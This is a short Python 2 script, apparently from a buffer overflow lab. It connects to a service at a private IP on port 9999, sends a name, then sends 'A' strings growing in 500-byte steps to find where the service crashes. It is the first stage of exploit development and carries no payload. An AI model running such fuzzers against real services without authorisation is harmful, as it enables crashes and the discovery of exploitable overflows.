#!/usr/bin/python

import socket
from time import sleep

#buffer = "A" * 100

#while True:
#		try: 
            #print "Sending the evil buffer...!!"

buffer=["A"]
counter=500
while len(buffer) <= 100:
    buffer.append("A"*counter)
    counter=counter+500

for string in buffer:
    print "Fuzzing the message with %s bytes" % len(string)
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(('172.16.215.167',9999))
    print s.recv(1024)
    print s.recv(1024)
    s.send("natz \r\n")
    print s.recv(1024)
    s.send(string)
    s.close()
			